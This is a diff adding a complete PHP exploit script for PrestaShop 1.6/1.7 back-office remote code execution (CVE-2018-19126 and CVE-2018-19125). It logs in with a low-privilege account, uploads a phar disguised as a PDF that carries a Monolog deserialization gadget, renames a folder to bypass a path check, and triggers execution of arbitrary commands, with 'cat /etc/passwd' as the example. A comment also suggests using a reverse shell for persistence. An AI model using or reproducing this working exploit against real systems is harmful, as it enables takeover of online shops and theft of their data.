@@ -1,0 +1,225 @@
+<?php
+/**
+ * 
+ * PrestaShop 1.6.x <= 1.6.1.23 & 1.7.x <= 1.7.4.4 - Back Office Remote Code Execution
+ * See https://github.com/farisv/PrestaShop-CVE-2018-19126 for explanation.
+ * 
+ * Chaining multiple vulnerabilities to trigger deserialization via phar.
+ *
+ * Date:
+ *   December 1st, 2018
+ *
+ * Author:
+ *   farisv
+ *
+ * Vendor Homepage:
+ *   https://www.prestashop.com/
+ *
+ * Vulnerable Package Link:
+ *   https://assets.prestashop2.com/en/system/files/ps_releases/prestashop_1.7.4.3.zip
+ *
+ * CVE :
+ *   - CVE-2018-19126
+ *   - CVE-2018-19125
+ * 
+ * Prerequisite:
+ *   - PrestaShop 1.6.x before 1.6.1.23 or 1.7.x before 1.7.4.4.
+ *   - Back Office account (logistician, translator, salesman, etc.).
+ * 
+ * Usage:
+ *   php exploit.php back-office-url email password func param
+ * 
+ * Example:
+ *   php exploit.php http://127.0.0.1/admin-dev/ salesman@shop.com 54l35m4n123
+ *   system 'cat /etc/passwd'
+ * 
+ * Note:
+ * Note that the upload directory will be renamed and you can't upload the
+ * malicious phar file again if the folder name is not reverted. You might want
+ * to execute reverse shell to gain persistence RCE or include the command to
+ * rename the folder again in your payload (you need to know the path to the
+ * upload directory).
+ * 
+ * FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THIS SCRIPT FOR ILLEGAL ACTIVITIES.
+ * THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.
+ * 
+ */
+
+namespace PrestaShopRCE {
+
+    class Exploit {
+        private $url;
+        private $email;
+        private $passwd;
+        private $cmd;
+        private $func;
+        private $param;
+
+        public function __construct($url, $email, $passwd, $func, $param) {
+            $this->url = $url;
+            $this->email = $email;
+            $this->passwd = $passwd;
+            $this->func = $func;
+            $this->param = $param;
+        }
+
+        private function post($path, $data, $cookie) {
+            $curl_handle = curl_init();
+            
+            $options = array(
+                CURLOPT_URL => $this->url . $path,
+                CURLOPT_HEADER => true,
+                CURLOPT_POST => 1,
+                CURLOPT_POSTFIELDS => $data,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_COOKIE => $cookie
+            );
+            
+            curl_setopt_array($curl_handle, $options);
+            $raw = curl_exec($curl_handle);
+            curl_close($curl_handle);
+
+            return $raw;
+        }
+
+        private function fetch_cookie($raw) {
+            $header = "Set-Cookie: ";
+            $cookie_header_start = strpos($raw, $header);
+            $sliced_part = substr($raw, $cookie_header_start + strlen($header));
+            $cookie = substr($sliced_part, 0, strpos($sliced_part, ';'));
+            return $cookie;
+        }
+
+        public function run() {
+
+            // Login and get PrestaShop cookie
+            $data = array(
+                'email' => $this->email,
+                'passwd' => $this->passwd,
+                'submitLogin' => '1',
+                'controller' => 'AdminLogin',
+                'ajax' => '1'
+            );
+            $cookie = "";
+            $raw = $this->post('/', $data, $cookie);
+            $prestashop_cookie = $this->fetch_cookie($raw);
+
+            // Get FileManager cookie
+            $data = array();
+            $cookie = $prestashop_cookie;
+            $raw = $this->post('/filemanager/dialog.php', $data, $cookie);
+            $filemanager_cookie = $this->fetch_cookie($raw);
+
+            // Craft deserialization gadget
+            $gadget = new \Monolog\Handler\SyslogUdpHandler(
+                new \Monolog\Handler\BufferHandler(
+                    ['current', $this->func],
+                    [$this->param, 'level' => null]
+                )
+            );
+
+            // Craft malicious phar file
+            $phar = new \Phar('phar.phar');
+            $phar->startBuffering();
+            $phar->addFromString('test', 'test');
+            $phar->setStub('<?php __HALT_COMPILER(); ? >');
+            $phar->setMetadata($gadget);
+            $phar->stopBuffering();
+
+            // Change the extension
+            rename('phar.phar', 'phar.pdf');
+
+            // Cookie for next requests
+            $cookie = "$prestashop_cookie; $filemanager_cookie";
+
+            // Upload phar.pdf
+            $curl_file = new \CurlFile('phar.pdf', 'application/pdf', 'phar.pdf');
+            $data = array(
+                'file' => $curl_file
+            );
+            $raw = $this->post('/filemanager/upload.php', $data, $cookie);
+
+            // Rename image directory to bypass realpath() check
+            $data = array(
+                'name' => 'renamed'
+            );
+            $raw = $this->post(
+                '/filemanager/execute.php?action=rename_folder',
+                $data,
+                $cookie
+            );
+
+            // Trigger deserialization
+            // The '/img/cms/' substring is important to bypass string check
+            $data = array(
+                'path' => 'phar://../../img/renamed/phar.pdf/img/cms/'
+            );
+            $raw = $this->post(
+                '/filemanager/ajax_calls.php?action=image_size',
+                $data,
+                $cookie
+            );
+
+            // Display the raw result
+            print $raw;
+
+        }
+    }
+
+}
+
+/*
+ * Based on
+ * https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/
+*/
+namespace Monolog\Handler {
+
+    class SyslogUdpHandler {
+        protected $socket;
+
+        function __construct($param) {
+            $this->socket = $param;
+        }
+    }
+
+    class BufferHandler {
+        protected $handler;
+        protected $bufferSize = -1;
+        protected $buffer;
+        protected $level = null;
+        protected $initialized = true;
+        protected $bufferLimit = -1;
+        protected $processors;
+
+        function __construct($methods, $command) {
+            $this->processors = $methods;
+            $this->buffer = [$command];
+            $this->handler = clone $this;
+        }
+    }
+
+}
+
+namespace {
+
+    if (count($argv) != 6) {
+        $hint = "Usage:\n  php $argv[0] back-office-url email password func param\n\n";
+        $hint .= "Example:\n  php $argv[0] http://127.0.0.1/admin-dev/ ";
+        $hint .= "salesman@shop.com 54l35m4n123 system 'uname -a'";
+        die($hint);
+    }
+
+    if (!extension_loaded('curl')) {
+        die('Need php-curl');
+    }
+
+    $url = $argv[1];
+    $email = $argv[2];
+    $passwd = $argv[3];
+    $func = $argv[4];
+    $param = $argv[5];
+
+    $exploit = new PrestaShopRCE\Exploit($url, $email, $passwd, $func, $param);
+    $exploit->run();
+
+}
